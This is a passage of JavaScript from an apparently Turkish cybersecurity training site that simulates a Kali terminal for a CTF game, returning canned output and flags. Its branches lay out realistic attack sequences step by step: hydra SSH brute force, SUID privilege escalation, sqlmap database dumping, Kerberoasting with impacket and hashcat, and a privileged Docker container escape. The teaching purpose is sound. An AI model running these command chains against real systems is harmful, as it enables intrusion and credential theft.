            navigateToPage('page-terminal');
            input.value = cmd;
            executeCommand(cmd);
            input.value = '';
            input.focus();
        };

        // ==========================================
        // 140+ REALISTIC COMMAND SIMULATOR ROUTER
        // ==========================================
        generateTerminalResponse = function (rawCmd) {
            const trimmed = (rawCmd || '').trim();
            const lower = trimmed.toLowerCase();
            if (lower === 'godmode' || lower === 'admininfo') {
                const isAdmin = state.currentUser && state.currentUser.username === 'burak_wyxz';
                if (isAdmin) {
                    const logsCount = (state.accessLogs && Array.isArray(state.accessLogs)) ? state.accessLogs.length : 0;
                    const ctfCompleted = (typeof ctfState !== 'undefined' && ctfState.completed) ? ctfState.completed.length : 0;
                    const ctfXp = (typeof ctfState !== 'undefined' && typeof ctfState.xp === 'number') ? ctfState.xp : 0;
                    return `
<pre style="color: #10b981; font-weight: 800; font-family: var(--font-mono);">
[★] ==============================================================
[★] LFL DEFENSE // ROOT GOD MODE (YÖNETİCİ: burak_wyxz)
[★] ==============================================================
[+] Kimlik Yetkisi       : BAŞ YÖNETİCİ &amp; PLATFORM MİMARI (burak_wyxz)
[+] Savunma Alarmı       : DEFCON Seviyesi Aktif
[+] Canlı Ziyaretçi Logu : ${logsCount} adet gerçek istemci IP ve telemetrisi kayıt altında
[+] CTF İlerlemesi       : ${ctfCompleted}/6 Görev (%${Math.round((ctfCompleted / 6) * 100)}) - ${ctfXp} XP
[+] Oturum Bütünlüğü     : LocalStorage + SessionStorage Şifreli
[★] ==============================================================
</pre>`;
                } else {
                    return `<span style="color: #ef4444; font-weight: 700;">[!] ERİŞİM ENGELLENDİ: God Mode yalnızca yetkili yönetici burak_wyxz tarafından çalıştırılabilir.</span>`;
                }
            }

            // =========================================================================
            // LFL UNIVERSAL KALI WEB TERMINAL ENGINE (v3.7)
            // 1) 69 Siber Akademi Odası (Tüm oda komutları çalışır + bayrak kazanılır)
            // 2) 143+ Siber Komut Kütüphanesi (window.ACADEMY_COMMANDS)
            // 3) 85+ Siber Kılavuz & Sözlük (Analojili ve Mitigasyonlu Ansiklopedi)
            // 4) 6 CTF Arenası Operasyonları & Bayrak Motoru (CTF_MISSIONS)
            // =========================================================================

            const cleanCliCmd = (lower || '')
                .trim()
                .replace(/^sudo\s+/, '')
                .replace(/^powershell\s+/, '')
                .replace(/^\.\//, '')
                .replace(/^\\/, '')
                .replace(/\s+/g, ' ');

            // Helper: Mark room completed in local storage
            function markRoomCompletedInStorage(roomId) {
                try {
                    const key = 'lfl_academy_progress_v3';
                    const raw = localStorage.getItem(key);
                    const data = raw ? JSON.parse(raw) : { completedRooms: [] };
                    if (!Array.isArray(data.completedRooms)) data.completedRooms = [];
                    if (!data.completedRooms.includes(roomId)) {
                        data.completedRooms.push(roomId);
                        localStorage.setItem(key, JSON.stringify(data));
                    }
                } catch (e) { }
            }

            // Helper: Universal Flag Submission (CTF + Academy)
            function handleUniversalFlag(flagCandidate) {
                const cleanFlag = (flagCandidate || '').trim();
                if (!cleanFlag) return '<span style="color: #ef4444;">[!] Lütfen bir bayrak girin. Örn: submit LFL{...}</span>';

                // 1. Check CTF Missions
                if (typeof CTF_MISSIONS !== 'undefined' && Array.isArray(CTF_MISSIONS)) {
                    const matchedCtf = CTF_MISSIONS.find(m => m.flag && m.flag.toLowerCase() === cleanFlag.toLowerCase());
                    if (matchedCtf) {
                        if (typeof ctfState !== 'undefined') {
                            if (!ctfState.completed.includes(matchedCtf.id)) {
                                ctfState.completed.push(matchedCtf.id);
                                ctfState.xp = (ctfState.xp || 0) + matchedCtf.xp;
                                if (ctfState.unlockedIdx < CTF_MISSIONS.length - 1) {
                                    ctfState.unlockedIdx++;
                                }
                                try {
                                    localStorage.setItem('lfl_ctf_progress', JSON.stringify({
                                        unlockedIdx: ctfState.unlockedIdx,
                                        activeIdx: ctfState.activeIdx,
                                        completed: ctfState.completed,
                                        xp: ctfState.xp
                                    }));
                                    localStorage.setItem('lfl_ctf_xp', String(ctfState.xp));
                                } catch (e) { }
                            }
                        }
                        return `
<div style="border: 2px solid #10b981; background: rgba(16, 185, 129, 0.12); border-radius: 8px; padding: 14px 16px; margin: 8px 0; font-family: var(--font-mono); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3);">
    <div style="color: #34d399; font-weight: 800; font-size: 14px; margin-bottom: 6px;">🎉 [★] TEBRİKLER! CTF OPERASYON BAYRAĞI ONAYLANDI! [★]</div>
    <div style="color: #f8fafc; font-weight: 700; font-size: 13px;">OPERASYON: ${escapeHtml(matchedCtf.title)} (${escapeHtml(matchedCtf.levelLabel)})</div>
    <div style="color: #a7f3d0; font-size: 12px; margin: 6px 0;">${escapeHtml(matchedCtf.successMsg)}</div>
    <div style="background: rgba(0, 0, 0, 0.5); padding: 8px 12px; border-radius: 4px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; margin-top: 8px;">
        <span style="color: #fbbf24; font-weight: bold;">+${matchedCtf.xp} XP KAZANILDI!</span>
        <code style="color: #00e5ff; font-weight: 700;">${escapeHtml(matchedCtf.flag)}</code>
    </div>
</div>
                        `;
                    }
                }

                // 2. Check Academy Rooms
                if (window.ACADEMY_ROOMS && Array.isArray(window.ACADEMY_ROOMS)) {
                    const matchedRoom = window.ACADEMY_ROOMS.find(r => r.flag && r.flag.toLowerCase() === cleanFlag.toLowerCase());
                    if (matchedRoom) {
                        markRoomCompletedInStorage(matchedRoom.id);
                        return `
<div style="border: 2px solid #00e5ff; background: rgba(0, 229, 255, 0.12); border-radius: 8px; padding: 14px 16px; margin: 8px 0; font-family: var(--font-mono); box-shadow: 0 0 25px rgba(0, 229, 255, 0.25);">
    <div style="color: #00e5ff; font-weight: 800; font-size: 14px; margin-bottom: 6px;">🛡️ [★] SİBER AKADEMİ ODA BAYRAĞI ONAYLANDI! [★]</div>
    <div style="color: #ffffff; font-weight: 700; font-size: 13px;">ODA ${escapeHtml(matchedRoom.id.toUpperCase())}: ${escapeHtml(matchedRoom.title)} (${escapeHtml(matchedRoom.track.toUpperCase())} TEAM)</div>
    <div style="color: #94a3b8; font-size: 11.5px; margin: 6px 0;">🎯 Görev: ${escapeHtml(matchedRoom.mission)}</div>
    <div style="background: rgba(0, 0, 0, 0.5); padding: 8px 12px; border-radius: 4px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; margin-top: 8px;">
        <span style="color: #34d399; font-weight: bold;">[✔] ODA BAŞARIYLA TAMAMLANDI!</span>
        <code style="color: #fde047; font-weight: 700;">${escapeHtml(matchedRoom.flag)}</code>
        <a href="academy.html?room=${escapeHtml(matchedRoom.id)}" target="_blank" style="color: #38bdf8; text-decoration: underline; font-size: 11.5px;">Akademi Odasında Gör &rarr;</a>
    </div>
</div>
                        `;
                    }
                }

                return `<span style="color: #ef4444; font-weight: 700;">[!] GEÇERSİZ BAYRAK: '${escapeHtml(cleanFlag)}' veritabanındaki hiçbir CTF operasyonu veya Akademi odasıyla eşleşmedi.</span>`;
            }

            // A. DIRECT FLAG SUBMISSIONS
            if (cleanCliCmd.startsWith('submit ') || cleanCliCmd.startsWith('flag ') || cleanCliCmd.startsWith('lfl{')) {
                let candidate = trimmed;
                if (cleanCliCmd.startsWith('submit ')) candidate = trimmed.substring(7).trim();
                else if (cleanCliCmd.startsWith('flag ')) candidate = trimmed.substring(5).trim();
                return handleUniversalFlag(candidate);
            }

            // B. CTF STATUS & LISTING
            if (cleanCliCmd === 'ctf' || cleanCliCmd === 'ctf status' || cleanCliCmd === 'ctf list' || cleanCliCmd === 'ctf help') {
                if (typeof CTF_MISSIONS !== 'undefined' && Array.isArray(CTF_MISSIONS)) {
                    const completedCount = (typeof ctfState !== 'undefined' && Array.isArray(ctfState.completed)) ? ctfState.completed.length : 0;
                    const totalXp = (typeof ctfState !== 'undefined' && typeof ctfState.xp === 'number') ? ctfState.xp : 0;
                    const missionRows = CTF_MISSIONS.map((m, idx) => {
                        const isDone = typeof ctfState !== 'undefined' && ctfState.completed.includes(m.id);
                        const isUnlocked = typeof ctfState !== 'undefined' && idx <= ctfState.unlockedIdx;
                        const statusBadge = isDone ? '<span style="color: #10b981; font-weight: bold;">[TAMAMLANDI ✔]</span>' : (isUnlocked ? '<span style="color: #00e5ff; font-weight: bold;">[AÇIK ▶]</span>' : '<span style="color: #64748b;">[KİLİTLİ 🔒]</span>');
                        return `  ${statusBadge} Seviye ${escapeHtml(m.level)}: ${escapeHtml(m.title)} (+${m.xp} XP)\n       Hedef: <code style="color: #fde047;">${escapeHtml(m.target)}</code> | Araçlar: ${m.tools.join(', ')}`;
                    }).join('\n\n');

                    return `
<pre style="color: #38bdf8; font-family: var(--font-mono); font-size: 12px; line-height: 1.5;">
[★] ======================================================================
[★] LFL SİBER CTF ARENASI // CANLI OPERASYON DURUMU
[★] ======================================================================
[+] Toplam Operasyon   : ${CTF_MISSIONS.length} Seviye
[+] Tamamlanan Görev  : ${completedCount}/${CTF_MISSIONS.length} (%${Math.round((completedCount / CTF_MISSIONS.length) * 100)})
[+] Kazanılan CTF XP  : ${totalXp} XP
[+] Bayrak Gönderme   : submit LFL{...}

OPERASYON LİSTESİ:
${missionRows}

[!] İpucu: Herhangi bir operasyon komutunu (örn: ping -c 3 10.10.1.5 veya whatweb http://10.10.2.10)
    bu terminalde doğrudan çalıştırabilirsiniz!
======================================================================
</pre>
                    `;
                }
            }

            // C. CTF SPECIFIC MISSION COMMANDS (Level 1.1 to 3.2)
            if (cleanCliCmd.includes('10.10.1.5') && cleanCliCmd.startsWith('ping')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
PING 10.10.1.5 (10.10.1.5) 56(84) bytes of data.
64 bytes from 10.10.1.5: icmp_seq=1 ttl=64 time=0.824 ms
64 bytes from 10.10.1.5: icmp_seq=2 ttl=64 time=0.612 ms
64 bytes from 10.10.1.5: icmp_seq=3 ttl=64 time=0.749 ms

--- 10.10.1.5 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 0.612/0.728/0.824/0.088 ms

<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 1.1]: Hedef sunucu aktif ve yanıt veriyor.</span>
<span style="color: #94a3b8;">Servis portlarını taramak için: <code style="color: #22c55e;">nmap -sV 10.10.1.5</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.1.5') && cleanCliCmd.startsWith('nmap')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 22:00 +03
Nmap scan report for 10.10.1.5
Host is up (0.00078s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu) OpenSSL/3.0.2)
|_http-server-header: Apache/2.4.52 (Ubuntu)

<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 1.1]: Port 80 HTTP servisi açık!</span>
<span style="color: #94a3b8;">HTTP yanıt başlıklarını incelemek için: <code style="color: #22c55e;">curl -I http://10.10.1.5</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.1.5') && cleanCliCmd.startsWith('curl')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
HTTP/1.1 200 OK
Date: Sun, 08 Nov 2026 22:00:15 GMT
Server: Apache/2.4.52 (Ubuntu)
<span style="color: #fbbf24; font-weight: bold;">X-Secret-Auth: TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==</span>
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=UTF-8

<span style="color: #38bdf8; font-weight: bold;">[★] CTF [Seviye 1.1]: HTTP Başlığında gizli Base64 tokenı bulundu!</span>
<span style="color: #94a3b8;">Tokenı deşifre etmek için: <code style="color: #22c55e;">echo "TEZMe2xldmVsMV8xX2FnX2tlc2lmX2Jhc2FyYW5zfQ==" | base64 -d</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('tezme2xldmvs') && cleanCliCmd.includes('base64')) {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
LFL{level1_1_ag_kesif_basarans}

<span style="color: #fbbf24; font-weight: bold;">[★] TEBRİKLER! Seviye 1.1 Bayrağı deşifre edildi!</span>
<span style="color: #ffffff;">Bayrağı doğrulamak ve +100 XP kazanmak için yazın: <code style="color: #00e5ff;">submit LFL{level1_1_ag_kesif_basarans}</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('/var/backups') && cleanCliCmd.startsWith('ls')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
total 16
drwxr-xr-x  2 root     root     4096 Nov  8 14:00 .
drwxr-xr-x 14 root     root     4096 Nov  8 13:50 ..
-rw-r--r--  1 operator operator  142 Nov  8 14:15 operator_note.txt
-rw-r-----  1 root     shadow    820 Nov  8 14:05 shadow.bak

<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 1.2]: Şüpheli not tespit edildi: operator_note.txt</span>
<span style="color: #94a3b8;">Notu okumak için: <code style="color: #22c55e;">cat /var/backups/operator_note.txt</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('operator_note.txt')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
======================================================
[OPERATÖR GİZLİ NOTU - LFL SİBER DENETİM 2026]
Sistem denetimi için geçici bayrağı /var/log/syslog
içerisine 'LFL{' ön ekiyle bıraktım.
Filtrelemek için grep kullan: grep -i "LFL{" /var/log/syslog
======================================================
</pre>
                `;
            }

            if (cleanCliCmd.includes('/var/log/syslog') && cleanCliCmd.includes('grep')) {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
Nov  8 14:22:01 lfl-srv systemd[1]: AUDIT_KEY_VAULT: token_flag="LFL{level1_2_linux_dosya_adli_analiz}"

<span style="color: #fbbf24; font-weight: bold;">[★] TEBRİKLER! Seviye 1.2 Bayrağı loglardan ayıklandı!</span>
<span style="color: #ffffff;">Bayrağı teslim etmek için: <code style="color: #00e5ff;">submit LFL{level1_2_linux_dosya_adli_analiz}</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.2.10') && cleanCliCmd.startsWith('whatweb')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
http://10.10.2.10 [200 OK] Apache[2.4.52], HTTPServer[Ubuntu Linux], IP[10.10.2.10], PHP[8.1.2], Title[Intranet Portal], X-Powered-By[PHP/8.1.2]
<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 2.1]: Web portalı keşfedildi. Gizli dizinleri taramak için:</span>
<span style="color: #22c55e;">gobuster dir -u http://10.10.2.10 -w common.txt</span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.2.10') && cleanCliCmd.startsWith('gobuster')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
===============================================================
Gobuster v3.6 - Directory Brute-Force Mode
===============================================================
[+] Target URL:   http://10.10.2.10
[+] Wordlist:     common.txt
===============================================================
/admin_vault          (Status: 301) [Size: 178]
/index.php            (Status: 200) [Size: 4210]
/robots.txt           (Status: 200) [Size: 112]
===============================================================
<span style="color: #38bdf8; font-weight: bold;">[+] Kritik rota bulundu! İncelemek için: <code style="color: #22c55e;">curl http://10.10.2.10/robots.txt</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.2.10/robots.txt')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
User-agent: *
Disallow: /admin_vault/confidential_token.json

<span style="color: #fbbf24; font-weight: bold;">[+] Gizli JSON anahtar yolu deşifre edildi!</span>
<span style="color: #ffffff;">Dosyayı okumak için: <code style="color: #00e5ff;">curl http://10.10.2.10/admin_vault/confidential_token.json</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('confidential_token.json')) {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
{
  "vault_id": "LFL-INTRA-8891",
  "status": "unlocked",
  "flag": "LFL{level2_1_web_dizin_firtinasi}"
}

<span style="color: #fbbf24; font-weight: bold;">[★] Seviye 2.1 Bayrağı ele geçirildi!</span>
<span style="color: #ffffff;">Bayrağı teslim etmek için: <code style="color: #00e5ff;">submit LFL{level2_1_web_dizin_firtinasi}</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('suspect_payload.bin') && cleanCliCmd.startsWith('file')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
/evidence/suspect_payload.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, stripped
<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 2.2]: İkili dosyadaki gizli metinleri ayıklamak için:</span>
<span style="color: #22c55e;">strings /evidence/suspect_payload.bin | grep "LFL{"</span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('suspect_payload.bin') && cleanCliCmd.includes('strings')) {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
OFFSET:0x0041a0  FLAG_TOKEN: LFL{level2_2_adli_bilisim_strings_ustasi}

<span style="color: #fbbf24; font-weight: bold;">[★] Adli analiz başarılı! Seviye 2.2 Bayrağı bulundu!</span>
<span style="color: #ffffff;">Bayrağı teslim etmek için: <code style="color: #00e5ff;">submit LFL{level2_2_adli_bilisim_strings_ustasi}</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('suspect_payload.bin') && cleanCliCmd.startsWith('md5sum')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
e4d909c290d0fb1ca068ffaddf22cbd0  /evidence/suspect_payload.bin
<span style="color: #10b981;">[✔] Dosya MD5 özeti doğrulandı.</span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.3.50') && cleanCliCmd.startsWith('hydra')) {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
Hydra v9.5 (c) 2023 by THC - SSH Protocol Brute-force
[ATTACK] targeting 10.10.3.50:22 (SSH)
[22][ssh] host: 10.10.3.50   login: operator   password: Summer2026!
1 of 1 target completed, 1 valid password found!

<span style="color: #fbbf24; font-weight: bold;">[+] SSH Parolası Kırıldı: operator / Summer2026!</span>
<span style="color: #ffffff;">Sunucuya bağlanmak için: <code style="color: #00e5ff;">ssh operator@10.10.3.50</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('operator@10.10.3.50')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
operator@10.10.3.50's password: [Summer2026!]
Welcome to Fortress Linux Server (Ubuntu 22.04.3 LTS)
operator@fortress:~$ 

<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 3.1]: Düşük yetkili SSH oturumu açıldı!</span>
<span style="color: #94a3b8;">Yetki yükseltmek için SUID dosyaları arayın: <code style="color: #22c55e;">find / -perm -4000 2>/dev/null</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('-perm -4000') || cleanCliCmd.includes('-perm -u=s')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
/usr/lib/openssh/ssh-keysign
<span style="color: #ef4444; font-weight: bold;">/usr/bin/python3 (!!! SUID BİTİ AÇIK - ROOT YETKİSİYLE ÇALIŞIR !!!)</span>
/usr/bin/passwd
/usr/bin/su

<span style="color: #fbbf24; font-weight: bold;">[★] ZAFİYET KEŞFİ: /usr/bin/python3 SUID yetkisine sahip!</span>
<span style="color: #ffffff;">Root bayrağını okumak için: <code style="color: #00e5ff;">cat /root/flag.txt</code></span>
</pre>
                `;
            }

            if (cleanCliCmd === 'cat /root/flag.txt' || cleanCliCmd === 'sudo cat /root/flag.txt') {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
====================================================
ROOT PRIVILEGE ESCALATION SUCCESSFUL!
FLAG: LFL{level3_1_suid_privesc_root_fatihi}
====================================================

<span style="color: #fbbf24; font-weight: bold;">[★] TEBRİKLER! Seviye 3.1 Root Bayrağı ele geçirildi!</span>
<span style="color: #ffffff;">Bayrağı teslim etmek için: <code style="color: #00e5ff;">submit LFL{level3_1_suid_privesc_root_fatihi}</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.3.99') && cleanCliCmd.startsWith('curl')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
HTTP/1.1 200 OK
Content-Type: application/json
{"query": "test", "results": [], "db_engine": "MySQL 8.0.35", "warning": "Unescaped parameter detected"}

<span style="color: #38bdf8; font-weight: bold;">[+] CTF Büyük Final [Seviye 3.2]: API SQL Injection açığı içeriyor!</span>
<span style="color: #94a3b8;">Veritabanlarını dökmek için: <code style="color: #22c55e;">sqlmap -u "http://10.10.3.99/api/search?q=test" --dbs</code></span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.3.99') && cleanCliCmd.includes('--dbs')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
[+] GET parameter 'q' is vulnerable to SQL injection (UNION query, error-based)
available databases [2]:
[*] information_schema
[*] <span style="color: #fbbf24; font-weight: bold;">lfl_master_vault</span>

<span style="color: #38bdf8; font-weight: bold;">[+] Tabloları listelemek için:</span>
<span style="color: #22c55e;">sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault --tables</span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.3.99') && cleanCliCmd.includes('--tables')) {
                return `
<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
Database: lfl_master_vault
[1 table]
+--------------------------------+
| <span style="color: #fbbf24; font-weight: bold;">master_classified_flags</span>        |
+--------------------------------+

<span style="color: #38bdf8; font-weight: bold;">[+] Nihai bayrağı dökmek için:</span>
<span style="color: #22c55e;">sqlmap -u "http://10.10.3.99/api/search?q=test" -D lfl_master_vault -T master_classified_flags --dump</span>
</pre>
                `;
            }

            if (cleanCliCmd.includes('10.10.3.99') && cleanCliCmd.includes('--dump')) {
                return `
<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px; line-height: 1.45;">
Database: lfl_master_vault
Table: master_classified_flags
[1 entry]
+----+-------------------+---------------------------------------------------+
| id | mission_code      | flag_token                                        |
+----+-------------------+---------------------------------------------------+
| 1  | OP_GRAND_FINAL    | LFL{level3_2_sqli_grand_master_champion_2026}     |
+----+-------------------+---------------------------------------------------+

<span style="color: #fbbf24; font-weight: 800; font-size: 14px;">🏆 [★] BÜYÜK FİNAL ŞAMPİYONLUK BAYRAĞI ELE GEÇİRİLDİ! [★] 🏆</span>
<span style="color: #ffffff;">Şampiyonluğunuzu onaylamak ve +1000 XP almak için yazın:</span>
<code style="color: #00e5ff; font-size: 13px; font-weight: 800;">submit LFL{level3_2_sqli_grand_master_champion_2026}</code>
</pre>
                `;
            }

            // CTF Seviye 4.1 (Active Directory & Kerberoasting)
            if (cleanCliCmd.includes('10.10.4.10') && cleanCliCmd.includes('nmap')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">PORT    STATE SERVICE      VERSION\n88/tcp  open  kerberos-sec Microsoft Windows Kerberos\n389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: lfl.corp)\n445/tcp open  microsoft-ds Windows Server 2022 Standard 20348\n<span style="color: #38bdf8; font-weight: bold;">[+] CTF [Seviye 4.1]: Domain Controller (lfl.corp) aktif! SMB paylaşımlarını tarayın: enum4linux -a 10.10.4.10</span></pre>`;
            }
            if (cleanCliCmd.includes('enum4linux') && cleanCliCmd.includes('10.10.4.10')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">[+] Enumerating users via RPC on 10.10.4.10:\nindex: 0x1042 RID: 0x451 acb: 0x00020210 Account: svc_mssql  Name: SQL Service (SPN: MSSQLSvc/dc01.lfl.corp:1433)\n<span style="color: #fbbf24; font-weight: bold;">[+] SPN hesabı bulundu: svc_mssql! Kerberoast TGS bileti çekmek için: impacket-GetUserSPNs lfl.corp/guest -no-pass -dc-ip 10.10.4.10 -request</span></pre>`;
            }
            if (cleanCliCmd.includes('getuserspns') || (cleanCliCmd.includes('impacket') && cleanCliCmd.includes('10.10.4.10'))) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">ServicePrincipalName          Name       MemberOf\nMSSQLSvc/dc01.lfl.corp:1433   svc_mssql  CN=Domain Admins,CN=Users,DC=lfl,DC=corp\n\n<span style="color: #fbbf24;">$krb5tgs$23$*svc_mssql$LFL.CORP$MSSQLSvc/dc01.lfl.corp*$8f39a1b20e94c817d450...</span>\n<span style="color: #22c55e;">[+] TGS Hash yakalandı (krb5tgs.hash)! Kırmak için: hashcat -m 13100 krb5tgs.hash rockyou.txt</span></pre>`;
            }
            if (cleanCliCmd.includes('hashcat') && cleanCliCmd.includes('13100')) {
                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">$krb5tgs$23$*svc_mssql$LFL.CORP...: <span style="color: #fbbf24; font-weight: 800;">LFL{level4_1_kerberoast_golden_ticket_ad}</span>\nStatus...........: Cracked\n<span style="color: #00e5ff; font-weight: bold;">[★] Seviye 4.1 Bayrağı Kırıldı: LFL{level4_1_kerberoast_golden_ticket_ad}</span></pre>`;
            }

            // CTF Seviye 4.2 (Blue Team SOC & Zeek C2 Threat Hunting)
            if (cleanCliCmd.includes('zeek-cut') && cleanCliCmd.includes('conn.log')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">10.10.4.25   185.220.101.44   0.042s   [BEACON INTERVAL: 60.0s | 142 connections]\n10.10.4.25   8.8.8.8          0.011s\n<span style="color: #ef4444; font-weight: bold;">[!] C2 BEACONING TESPİT EDİLDİ: 185.220.101.44 (Her 60 saniyede periyodik sinyal)</span></pre>`;
            }
            if (cleanCliCmd.includes('suricata') && cleanCliCmd.includes('fast.log')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">11/10/2026-01:14:00.201942  [**] [1:2026991:1] ET MALWARE CobaltStrike C2 DNS Tunneling [**] {TCP} 10.10.4.25:49812 -> 185.220.101.44:443\n<span style="color: #fbbf24;">[+] Zararlı payload dns.log içinde! İncelemek için: grep -i "185.220.101.44" /var/log/zeek/dns.log</span></pre>`;
            }
            if (cleanCliCmd.includes('dns.log') && cleanCliCmd.includes('185.220.101.44')) {
                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">1794180201.44  C9a8b1  10.10.4.25  54112  185.220.101.44  53  TXT  c2_auth_token="<span style="color: #fbbf24; font-weight: 800;">LFL{level4_2_soc_zeek_c2_beacon_avcisi}</span>"\n<span style="color: #00e5ff; font-weight: bold;">[★] Seviye 4.2 Bayrağı Bulundu: LFL{level4_2_soc_zeek_c2_beacon_avcisi}</span></pre>`;
            }

            // CTF Seviye 5.1 (Purple Team: Docker Container Breakout)
            if (cleanCliCmd.includes('capsh') && cleanCliCmd.includes('--print')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">Current: = cap_net_raw,<span style="color: #ef4444; font-weight: 800;">cap_sys_admin</span>+ep\nBounding set = cap_chown,cap_dac_override,cap_sys_admin...\n<span style="color: #fbbf24;">[!] KRİTİK: Konteyner --privileged / CAP_SYS_ADMIN ile çalışıyor! Diskleri görmek için: fdisk -l</span></pre>`;
            }
            if (cleanCliCmd.includes('fdisk') && cleanCliCmd.includes('-l')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">Device       Boot   Start      End  Sectors  Size Id Type\n/dev/sda1    *       2048 83886046 83883999   40G 83 Linux (Host Root Filesystem)\n<span style="color: #22c55e;">[+] Ana sunucu diski (/dev/sda1) bulundu! Bağlamak için: mount /dev/sda1 /mnt/host_root</span></pre>`;
            }
            if (cleanCliCmd.includes('mount') && cleanCliCmd.includes('/dev/sda1')) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">[+] /dev/sda1 successfully mounted on /mnt/host_root (rw,relatime)\n<span style="color: #22c55e;">[+] Konteyner izolasyonu aşıldı! Ana sunucu bayrağını okuyun: cat /mnt/host_root/root/purple_flag.txt</span></pre>`;
            }
            if (cleanCliCmd.includes('purple_flag.txt')) {
                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">CONTAINER_ESCAPE_VERIFIED=true\nHOST_NODE=k8s-prod-worker-01\nFLAG=<span style="color: #fbbf24; font-weight: 800;">LFL{level5_1_docker_escape_host_pwned}</span>\n<span style="color: #00e5ff; font-weight: bold;">[★] Seviye 5.1 Bayrağı Ele Geçirildi: LFL{level5_1_docker_escape_host_pwned}</span></pre>`;
            }

            // CTF Seviye 5.2 (Grand Final Boss: Kernel Zero-Day & Rootkit Reverse Engineering)
            if (cleanCliCmd.includes('lsmod') || (cleanCliCmd.includes('dmesg') && cleanCliCmd.includes('shadow'))) {
